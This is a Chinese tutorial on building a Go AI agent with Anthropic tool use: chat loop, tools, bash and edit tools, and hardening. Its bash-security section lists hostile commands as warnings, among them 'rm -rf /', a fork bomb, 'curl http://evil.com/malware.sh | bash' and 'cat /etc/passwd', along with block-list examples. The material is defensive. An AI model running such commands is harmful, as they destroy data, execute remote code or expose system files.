# 从零到一构建 AI Agent：完整教学指南

## 前言：学习路线图

```
┌─────────────────────────────────────────────────────────────┐
│                    30 天学习计划                             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Week 1: 基础入门                                           │
│  ├── Day 1-2: 理解 LLM API 基本概念                         │
│  ├── Day 3-4: 运行并理解 chat.go                            │
│  └── Day 5-7: 理解对话历史管理                              │
│                                                             │
│  Week 2: 工具系统                                           │
│  ├── Day 8-10: 理解 read.go 的工具机制                      │
│  ├── Day 11-12: 理解 JSON Schema 生成                       │
│  └── Day 13-14: 自己实现一个简单工具                        │
│                                                             │
│  Week 3: 进阶功能                                           │
│  ├── Day 15-17: 理解 bash_tool.go 的命令执行                │
│  ├── Day 18-20: 理解 edit_tool.go 的文件编辑                │
│  └── Day 21: 理解 code_search_tool.go                       │
│                                                             │
│  Week 4: 实战练习                                           │
│  ├── Day 22-25: 添加 2-3 个自定义工具                       │
│  ├── Day 26-28: 优化错误处理和日志                          │
│  └── Day 29-30: 思考生产级改进                              │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 第一阶段：理解基础 (Week 1)

### Day 1-2: LLM API 基本概念

#### 什么是 LLM API？

```
┌─────────────────────────────────────────────────────────────┐
│                    LLM API 交互模型                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  传统程序:                                                  │
│  ┌──────┐     输入确定的参数     ┌──────┐                  │
│  │ 调用 │ ────────────────────> │ 函数 │                  │
│  │      │ <──────────────────── │      │                  │
│  └──────┘     返回确定的结果     └──────┘                  │
│                                                             │
│  LLM API:                                                   │
│  ┌──────┐     发送对话历史     ┌──────┐                   │
│  │ 你的 │ ──────────────────> │ LLM  │                   │
│  │ 代码 │                     │ API  │                   │
│  │      │ <────────────────── │      │                   │
│  └──────┘     返回生成的文本   └──────┘                   │
│                                                             │
│  关键区别:                                                  │
│  1. 输入是对话历史 (数组)                                   │
│  2. 输出是生成的文本 (不确定)                               │
│  3. LLM 有"记忆" - 通过对话历史实现                         │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### Anthropic API 基本结构

```go
// 1. 创建客户端
client := anthropic.NewClient()  // 自动读取 ANTHROPIC_API_KEY 环境变量

// 2. 构造消息
message, err := client.Messages.New(ctx, anthropic.MessageNewParams{
    Model:     anthropic.ModelClaude3_7SonnetLatest,  // 使用哪个模型
    MaxTokens: int64(1024),                           // 最大生成 token 数
    Messages:  conversation,                          // 对话历史
})
```

#### 消息格式

```json
[
    {
        "role": "user",
        "content": [
            {
                "type": "text",
                "text": "你好，介绍一下自己"
            }
        ]
    },
    {
        "role": "assistant", 
        "content": [
            {
                "type": "text",
                "text": "你好！我是 Claude..."
            }
        ]
    }
]
```

### Day 3-4: 运行并理解 chat.go

#### 动手实验

```bash
# 1. 设置 API Key
export ANTHROPIC_API_KEY="your-key-here"

# 2. 运行基础版本
go run chat.go

# 3. 尝试对话
You: 你好
Claude: 你好！很高兴和你交流...

# 4. 运行详细模式
go run chat.go --verbose
```

#### 核心代码解析

**1. 初始化**

```go
func main() {
    // 解析命令行参数
    verbose := flag.Bool("verbose", false, "enable verbose logging")
    flag.Parse()
    
    // 设置日志
    if *verbose {
        log.SetOutput(os.Stderr)
        log.SetFlags(log.LstdFlags | log.Lshortfile)
    }
    
    // 创建 API 客户端
    client := anthropic.NewClient()
    
    // 创建用户输入函数
    scanner := bufio.NewScanner(os.Stdin)
    getUserMessage := func() (string, bool) {
        if !scanner.Scan() {
            return "", false
        }
        return scanner.Text(), true
    }
    
    // 创建 Agent
    agent := NewAgent(&client, getUserMessage, *verbose)
    
    // 运行 Agent
    agent.Run(context.TODO())
}
```

**2. Agent 结构**

```go
type Agent struct {
    client         *anthropic.Client        // API 客户端
    getUserMessage func() (string, bool)    // 获取用户输入
    verbose        bool                     // 调试模式
}

func (a *Agent) Run(ctx context.Context) error {
    // 对话历史 - 这是 Agent 的"记忆"
    conversation := []anthropic.MessageParam{}
    
    fmt.Println("Chat with Claude (use 'ctrl-c' to quit)")
    
    // 主循环
    for {
        // 1. 获取用户输入
        fmt.Print("\u001b[94mYou\u001b[0m: ")
        userInput, ok := a.getUserMessage()
        if !ok {
            break
        }
        
        // 2. 跳过空输入
        if userInput == "" {
            continue
        }
        
        // 3. 添加到对话历史
        userMessage := anthropic.NewUserMessage(
            anthropic.NewTextBlock(userInput)
        )
        conversation = append(conversation, userMessage)
        
        // 4. 调用 Claude
        message, err := a.runInference(ctx, conversation)
        if err != nil {
            return err
        }
        
        // 5. 保存 Claude 的回复到历史
        conversation = append(conversation, message.ToParam())
        
        // 6. 显示回复
        for _, content := range message.Content {
            if content.Type == "text" {
                fmt.Printf("\u001b[93mClaude\u001b[0m: %s\n", content.Text)
            }
        }
    }
    
    return nil
}
```

**3. API 调用**

```go
func (a *Agent) runInference(ctx context.Context, 
    conversation []anthropic.MessageParam) (*anthropic.Message, error) {
    
    message, err := a.client.Messages.New(ctx, anthropic.MessageNewParams{
        Model:     anthropic.ModelClaude3_7SonnetLatest,
        MaxTokens: int64(1024),
        Messages:  conversation,  // 传入完整对话历史
    })
    
    return message, err
}
```

### Day 5-7: 对话历史管理

#### 为什么需要对话历史？

```
┌─────────────────────────────────────────────────────────────┐
│                  对话历史的重要性                            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  场景 1: 没有 history                                       │
│  ┌────────────────────────────────────────┐                │
│  │ 第1轮:                                 │                │
│  │ 用户: "我的名字是张三"                  │                │
│  │ Claude: "你好张三！"                    │                │
│  │                                        │                │
│  │ 第2轮: (Claude 没有上一轮的记忆)        │                │
│  │ 用户: "我叫什么名字？"                  │                │
│  │ Claude: "抱歉，我不知道你的名字"        │                │
│  └────────────────────────────────────────┘                │
│                                                             │
│  场景 2: 有 history                                         │
│  ┌────────────────────────────────────────┐                │
│  │ 第1轮:                                 │                │
│  │ 用户: "我的名字是张三"                  │                │
│  │ Claude: "你好张三！"                    │                │
│  │                                        │                │
│  │ 第2轮: (Claude 看到完整历史)            │                │
│  │ 用户: "我叫什么名字？"                  │                │
│  │ 发送给 Claude:                         │                │
│  │ [                                       │                │
│  │   {role: "user", "我的名字是张三"},     │                │
│  │   {role: "assistant", "你好张三！"},    │                │
│  │   {role: "user", "我叫什么名字？"}      │                │
│  │ ]                                       │                │
│  │ Claude: "你叫张三"                      │                │
│  └────────────────────────────────────────┘                │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### 对话历史的实现

```go
// 对话历史是一个数组
conversation := []anthropic.MessageParam{}

// 每次用户输入后
conversation = append(conversation, userMessage)

// 每次 Claude 回复后
conversation = append(conversation, assistantMessage)

// 整个 conversation 被发送给 API
// Claude 可以看到所有历史消息
```

#### 练习任务

```
练习 1: 修改 chat.go，在每次 API 调用前打印对话历史长度
提示: 在 runInference 开始时添加 log.Printf

练习 2: 添加一个命令 "/history" 来显示对话历史
提示: 检查 userInput 是否是 "/history"，如果是则遍历 conversation 并打印

练习 3: 添加一个命令 "/clear" 来清空对话历史
提示: 重置 conversation = []anthropic.MessageParam{}
```

---

## 第二阶段：工具系统 (Week 2)

### Day 8-10: 理解 read.go 的工具机制

#### 从 chat.go 到 read.go 的变化

```
chat.go 的流程:
┌──────┐
│ 用户 │
└──┬───┘
   │
   ▼
┌──────┐
│ Claude│
└──┬───┘
   │
   ▼
文本回复

read.go 的流程:
┌──────┐
│ 用户 │
└──┬───┘
   │
   ▼
┌──────┐     可能调用工具
│ Claude│ ───────────────┐
└──┬───┘                 │
   │                     ▼
   │              ┌──────────┐
   │              │ 执行工具 │
   │              └────┬─────┘
   │                   │
   │                   ▼
   │              ┌──────────┐
   │              │ 返回结果 │
   │              │ 给 Claude│
   │              └────┬─────┘
   │                   │
   ▼                   ▼
文本回复 <─────────────┘
```

#### 新增的核心代码

**1. 工具定义**

```go
type ToolDefinition struct {
    Name        string                         // 工具名称
    Description string                         // 工具描述
    InputSchema anthropic.ToolInputSchemaParam // 参数 Schema
    Function    func(input json.RawMessage) (string, error) // 执行函数
}
```

**2. 工具注册**

```go
// 在 main 中注册工具
tools := []ToolDefinition{ReadFileDefinition}
agent := NewAgent(&client, getUserMessage, tools, *verbose)
```

**3. 工具调用处理**

```go
// 在 Agent.Run 中的新循环
for {
    // 收集工具调用
    var toolResults []anthropic.ContentBlockParamUnion
    var hasToolUse bool
    
    for _, content := range message.Content {
        switch content.Type {
        case "text":
            // 显示文本回复
            fmt.Printf("Claude: %s\n", content.Text)
            
        case "tool_use":
            // 处理工具调用
            hasToolUse = true
            toolUse := content.AsToolUse()
            
            // 执行工具
            result, err := executeTool(toolUse)
            
            // 收集结果
            toolResults = append(toolResults, 
                anthropic.NewToolResultBlock(toolUse.ID, result, err != nil))
        }
    }
    
    // 如果没有工具调用，退出循环
    if !hasToolUse {
        break
    }
    
    // 发送工具结果回 Claude
    toolResultMessage := anthropic.NewUserMessage(toolResults...)
    conversation = append(conversation, toolResultMessage)
    
    // 再次调用 Claude
    message, err = a.runInference(ctx, conversation)
    conversation = append(conversation, message.ToParam())
}
```

#### 动手实验

```bash
# 运行 read.go
go run read.go --verbose

# 尝试读取文件
You: 读取 fizzbuzz.js 的内容

# 观察日志输出
# 你会看到:
# - Tool use detected: read_file
# - Reading file: fizzbuzz.js
# - Successfully read file fizzbuzz.js (XXX bytes)
```

### Day 11-12: 理解 JSON Schema 生成

#### 为什么需要 JSON Schema？

```
┌─────────────────────────────────────────────────────────────┐
│                  Claude 如何理解工具参数                     │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  没有 Schema:                                               │
│  Claude: "我要调用 read_file"                               │
│  问题: 我需要传什么参数？参数类型是什么？                   │
│                                                             │
│  有 Schema:                                                 │
│  Claude 看到:                                               │
│  {                                                          │
│    "name": "read_file",                                     │
│    "description": "读取文件内容...",                        │
│    "input_schema": {                                        │
│      "properties": {                                        │
│        "path": {                                            │
│          "type": "string",                                  │
│          "description": "文件路径"                          │
│        }                                                    │
│      },                                                     │
│      "required": ["path"]                                   │
│    }                                                        │
│  }                                                          │
│                                                             │
│  Claude: "我知道了，需要传一个 string 类型的 path 参数"     │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### Schema 生成过程

```go
// 1. 定义输入结构体
type ReadFileInput struct {
    Path string `json:"path" jsonschema_description:"文件路径"`
}

// 2. 使用泛型函数生成 Schema
func GenerateSchema[T any]() anthropic.ToolInputSchemaParam {
    reflector := jsonschema.Reflector{
        AllowAdditionalProperties: false,
        DoNotReference:            true,
    }
    var v T
    
    // 通过反射分析结构体
    schema := reflector.Reflect(v)
    
    return anthropic.ToolInputSchemaParam{
        Properties: schema.Properties,
    }
}

// 3. 生成 Schema
var ReadFileInputSchema = GenerateSchema[ReadFileInput]()
```

#### 练习任务

```
练习 4: 打印生成的 Schema
在 main 函数中添加:
fmt.Printf("Schema: %+v\n", ReadFileInputSchema)

练习 5: 创建一个复杂参数的 Schema
type SearchInput struct {
    Query  string `json:"query" jsonschema_description:"搜索关键词"`
    Limit  int    `json:"limit,omitempty" jsonschema_description:"结果数量限制"`
    Offset int    `json:"offset,omitempty" jsonschema_description:"偏移量"`
}
生成 Schema 并打印，观察 omitempty 的效果

练习 6: 添加枚举值
type StatusInput struct {
    Status string `json:"status" jsonschema:"enum=pending,enum=active,enum=deleted"`
}
查看生成的 Schema 是否包含 enum 信息
```

### Day 13-14: 实现一个简单工具

#### 任务：实现一个计算器工具

```go
// 1. 定义输入
type CalculatorInput struct {
    Expression string `json:"expression" jsonschema_description:"数学表达式，如 1+2*3"`
}

// 2. 生成 Schema
var CalculatorInputSchema = GenerateSchema[CalculatorInput]()

// 3. 实现函数
func Calculator(input json.RawMessage) (string, error) {
    calcInput := CalculatorInput{}
    err := json.Unmarshal(input, &calcInput)
    if err != nil {
        return "", err
    }
    
    // 安全地计算表达式（简化版，实际生产需要更安全的方式）
    // 这里只是一个示例
    expr := strings.TrimSpace(calcInput.Expression)
    
    // 只允许数字和基本运算符
    valid := regexp.MustCompile(`^[0-9+\-*/().\s]+$`).MatchString(expr)
    if !valid {
        return "", fmt.Errorf("invalid expression")
    }
    
    // 使用 Go 的表达式计算（需要导入适当的库）
    // 简化处理：返回表达式本身
    return fmt.Sprintf("Expression: %s (计算功能待实现)", expr), nil
}

// 4. 创建定义
var CalculatorDefinition = ToolDefinition{
    Name:        "calculator",
    Description: "计算数学表达式的结果",
    InputSchema: CalculatorInputSchema,
    Function:    Calculator,
}

// 5. 在 read.go 的基础上添加这个工具
tools := []ToolDefinition{
    ReadFileDefinition,
    CalculatorDefinition,  // 新增
}
```

#### 测试你的工具

```bash
# 运行修改后的程序
go run your_file.go

# 测试
You: 帮我计算 123 + 456
Claude: [调用 calculator 工具]
tool: calculator({"expression": "123 + 456"})
result: Expression: 123 + 456 (计算功能待实现)
Claude: 计算结果是...
```

---

## 第三阶段：进阶功能 (Week 3)

### Day 15-17: 理解 bash_tool.go

#### bash 工具的实现

```go
type BashInput struct {
    Command string `json:"command" jsonschema_description:"要执行的 bash 命令"`
}

func Bash(input json.RawMessage) (string, error) {
    bashInput := BashInput{}
    json.Unmarshal(input, &bashInput)
    
    log.Printf("Executing: %s", bashInput.Command)
    
    // 关键：使用 exec.Command 执行命令
    cmd := exec.Command("bash", "-c", bashInput.Command)
    
    // 捕获 stdout 和 stderr
    output, err := cmd.CombinedOutput()
    
    if err != nil {
        // 注意：即使失败也返回输出，而不是 error
        // 这样 Claude 可以看到错误信息
        return fmt.Sprintf("Error: %s\nOutput: %s", 
            err.Error(), string(output)), nil
    }
    
    return strings.TrimSpace(string(output)), nil
}
```

#### 安全性思考

```
┌─────────────────────────────────────────────────────────────┐
│                   bash 工具的安全风险                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  危险命令:                                                  │
│  - rm -rf /                                                 │
│  - :(){ :|:& };:  (fork bomb)                              │
│  - curl http://evil.com/malware.sh | bash                  │
│  - cat /etc/passwd                                          │
│                                                             │
│  生产环境需要:                                              │
│  1. 命令白名单                                              │
│     allowed := []string{"ls", "cat", "git", "npm"}         │
│                                                             │
│  2. 危险命令黑名单                                          │
│     blocked := []string{"rm", "sudo", "curl | bash"}       │
│                                                             │
│  3. 用户确认                                                │
│     "Claude 想执行 'rm file.txt'，允许吗？(y/n)"            │
│                                                             │
│  4. 沙箱环境                                                │
│     在 Docker 容器中执行                                    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### 练习任务

```
练习 7: 添加命令白名单
修改 Bash 函数，只允许以下命令:
- ls, cat, pwd, echo, git, npm, go

练习 8: 添加危险命令检测
如果命令包含以下关键词，返回错误:
- rm -rf
- sudo
- curl | bash
- > /dev/

练习 9: 添加用户确认
在执行命令前，显示命令并询问用户是否继续
```

### Day 18-20: 理解 edit_tool.go

#### edit_file 的三种模式

```
模式 1: 替换内容
┌────────────────────────────────────────┐
│ 输入:                                   │
│ {                                       │
│   "path": "test.txt",                   │
│   "old_str": "hello",                   │
│   "new_str": "world"                    │
│ }                                       │
│                                         │
│ 效果:                                   │
│ 文件内容从 "hello world" 变成 "world world" │
└────────────────────────────────────────┘

模式 2: 创建文件
┌────────────────────────────────────────┐
│ 输入:                                   │
│ {                                       │
│   "path": "new.txt",                    │
│   "old_str": "",                        │
│   "new_str": "new file content"         │
│ }                                       │
│                                         │
│ 效果:                                   │
│ 创建 new.txt 文件，内容为 "new file content" │
└────────────────────────────────────────┘

模式 3: 追加内容
┌────────────────────────────────────────┐
│ 输入:                                   │
│ {                                       │
│   "path": "test.txt",                   │
│   "old_str": "",                        │
│   "new_str": "\nappended line"          │
│ }                                       │
│                                         │
│ 效果:                                   │
│ 在现有文件末尾追加内容                  │
└────────────────────────────────────────┘
```

#### 关键实现细节

```go
func EditFile(input json.RawMessage) (string, error) {
    editFileInput := EditFileInput{}
    json.Unmarshal(input, &editFileInput)
    
    // 验证: old_str 和 new_str 必须不同
    if editFileInput.OldStr == editFileInput.NewStr {
        return "", fmt.Errorf("old_str and new_str must be different")
    }
    
    // 读取文件
    content, err := os.ReadFile(editFileInput.Path)
    if err != nil {
        // 文件不存在
        if os.IsNotExist(err) && editFileInput.OldStr == "" {
            // 创建新文件
            return createNewFile(editFileInput.Path, editFileInput.NewStr)
        }
        return "", err
    }
    
    oldContent := string(content)
    
    // 替换模式
    if editFileInput.OldStr != "" {
        // 检查匹配次数
        count := strings.Count(oldContent, editFileInput.OldStr)
        if count == 0 {
            return "", fmt.Errorf("old_str not found")
        }
        if count > 1 {
            return "", fmt.Errorf("old_str found %d times, must be unique", count)
        }
        
        // 执行替换
        newContent := strings.Replace(oldContent, 
            editFileInput.OldStr, editFileInput.NewStr, 1)
        os.WriteFile(editFileInput.Path, []byte(newContent), 0644)
    } else {
        // 追加模式
        newContent := oldContent + editFileInput.NewStr
        os.WriteFile(editFileInput.Path, []byte(newContent), 0644)
    }
    
    return "OK", nil
}
```

#### 练习任务

```
练习 10: 添加备份功能
在编辑文件前，创建一个 .bak 备份文件

练习 11: 添加 diff 预览
在修改前，显示将要做的修改
格式:
--- old
+++ new
@@
-old line
+new line

练习 12: 添加行号模式
允许通过行号进行编辑
{
  "path": "test.txt",
  "start_line": 5,
  "end_line": 10,
  "new_str": "replacement"
}
```

### Day 21: 理解 code_search_tool.go

#### ripgrep 的优势

```bash
# 传统 grep
grep -r "pattern" .

# ripgrep (rg)
rg "pattern" .

# 性能对比（搜索 Linux 内核源码）
grep:    1.2 秒
rg:      0.05 秒
```

#### code_search 的参数

```go
type CodeSearchInput struct {
    Pattern       string  // 搜索模式（支持正则）
    Path          string  // 搜索路径（可选）
    FileType      string  // 文件类型（可选）
    CaseSensitive bool    // 是否区分大小写
}
```

#### 使用示例

```bash
# 在 Go 文件中搜索函数定义
Pattern: "func.*Handler"
FileType: "go"

# 在特定目录搜索
Pattern: "TODO"
Path: "src/"

# 区分大小写搜索
Pattern: "API"
CaseSensitive: true
```

---

## 第四阶段：实战练习 (Week 4)

### Day 22-25: 添加自定义工具

#### 任务：实现以下工具

**工具 1: 获取天气**

```go
type WeatherInput struct {
    City string `json:"city" jsonschema_description:"城市名称"`
}

func GetWeather(input json.RawMessage) (string, error) {
    // 实现提示：
    // 1. 调用天气 API（如 wttr.in）
    // 2. 解析返回的 JSON
    // 3. 格式化输出
}
```

**工具 2: HTTP 请求**

```go
type HTTPInput struct {
    URL    string `json:"url" jsonschema_description:"请求 URL"`
    Method string `json:"method" jsonschema_description:"HTTP 方法 (GET/POST/...)"`
    Body   string `json:"body,omitempty" jsonschema_description:"请求体（可选）"`
}

func HTTPRequest(input json.RawMessage) (string, error) {
    // 实现提示：
    // 1. 使用 net/http 包
    // 2. 根据方法构造请求
    // 3. 发送并返回响应
}
```

**工具 3: JSON 处理**

```go
type JSONInput struct {
    JSON    string `json:"json" jsonschema_description:"JSON 字符串"`
    Query   string `json:"query" jsonschema_description:"JMESPath 查询"`
}

func QueryJSON(input json.RawMessage) (string, error) {
    // 实现提示：
    // 1. 解析 JSON
    // 2. 执行 JMESPath 查询
    // 3. 返回结果
}
```

### Day 26-28: 优化和改进

#### 改进 1: 更好的错误处理

```go
// 定义错误类型
type ToolError struct {
    ToolName string
    Message  string
    Retry    bool  // 是否可重试
}

func (e *ToolError) Error() string {
    return fmt.Sprintf("%s: %s", e.ToolName, e.Message)
}

// 使用示例
if fileNotFound {
    return "", &ToolError{
        ToolName: "read_file",
        Message:  "file not found",
        Retry:    false,
    }
}
```

#### 改进 2: 工具执行超时

```go
func BashWithTimeout(input json.RawMessage) (string, error) {
    ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
    defer cancel()
    
    cmd := exec.CommandContext(ctx, "bash", "-c", bashInput.Command)
    output, err := cmd.CombinedOutput()
    
    if ctx.Err() == context.DeadlineExceeded {
        return "", fmt.Errorf("command timed out after 30 seconds")
    }
    
    return string(output), err
}
```

#### 改进 3: 工具调用日志

```go
type ToolExecutionLog struct {
    Timestamp time.Time
    ToolName  string
    Input     json.RawMessage
    Output    string
    Error     error
    Duration  time.Duration
}

func (a *Agent) executeToolWithLogging(toolUse anthropic.ToolUse) ToolExecutionLog {
    start := time.Now()
    
    result, err := tool.Function(toolUse.Input)
    
    return ToolExecutionLog{
        Timestamp: start,
        ToolName:  toolUse.Name,
        Input:     toolUse.Input,
        Output:    result,
        Error:     err,
        Duration:  time.Since(start),
    }
}
```

### Day 29-30: 思考生产级改进

#### 生产级 Agent 需要的功能

```
┌─────────────────────────────────────────────────────────────┐
│                 生产级 Agent 检查清单                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  安全性:                                                    │
│  □ 命令白名单/黑名单                                        │
│  □ 文件路径限制                                             │
│  □ 用户确认机制                                             │
│  □ 沙箱执行环境                                             │
│                                                             │
│  可靠性:                                                    │
│  □ API 调用重试                                             │
│  □ 错误恢复机制                                             │
│  □ 超时控制                                                 │
│  □ 限流控制                                                 │
│                                                             │
│  可观测性:                                                  │
│  □ 结构化日志                                               │
│  □ 指标收集                                                 │
│  □ 追踪信息                                                 │
│  □ 错误报告                                                 │
│                                                             │
│  性能:                                                      │
│  □ 流式响应                                                 │
│  □ 并发工具执行                                             │
│  □ 上下文压缩                                               │
│  □ 缓存机制                                                 │
│                                                             │
│  可扩展性:                                                  │
│  □ 插件系统                                                 │
│  □ 多模型支持                                               │
│  □ 工具链/工作流                                            │
│  □ 自定义提示词                                             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 附录：常见问题

### Q1: API Key 如何管理？

```bash
# 开发环境：环境变量
export ANTHROPIC_API_KEY="sk-..."

# 生产环境：密钥管理服务
# - AWS Secrets Manager
# - HashiCorp Vault
# - Azure Key Vault
```

### Q2: 如何处理 API 限流？

```go
import "golang.org/x/time/rate"

var limiter = rate.NewLimiter(rate.Every(time.Second), 10) // 每秒 10 次

func (a *Agent) runInference(ctx context.Context, ...) {
    limiter.Wait(ctx)
    // ... 调用 API
}
```

### Q3: 如何实现流式响应？

```go
stream, err := a.client.Messages.NewStreaming(ctx, params)
for {
    event, _ := stream.Recv()
    if event == nil {
        break
    }
    // 实时处理事件
    if event.ContentBlockDelta != nil {
        fmt.Print(event.ContentBlockDelta.Delta.Text)
    }
}
```

### Q4: 如何添加多模态支持？

```go
// 读取图片
imageData, _ := os.ReadFile("image.png")
base64Image := base64.StdEncoding.EncodeToString(imageData)

// 构造消息
message := anthropic.NewUserMessage(
    anthropic.NewImageBlock(base64Image, "image/png"),
    anthropic.NewTextBlock("这张图片里有什么？"),
)
```

---

## 总结

通过这 30 天的学习，你应该已经掌握了：

1. **基础概念**: LLM API、对话历史、事件循环
2. **工具系统**: 工具定义、Schema 生成、工具执行
3. **核心工具**: read_file, list_files, bash, edit_file, code_search
4. **实战能力**: 添加自定义工具、优化改进
5. **生产思维**: 安全性、可靠性、可观测性

下一步建议：
- 深入阅读其他 AI Agent 框架的源码（LangChain, AutoGPT 等）
- 尝试构建一个特定领域的 Agent（如代码审查 Agent、数据分析 Agent）
- 学习 Prompt Engineering 的最佳实践
- 探索多 Agent 协作模式
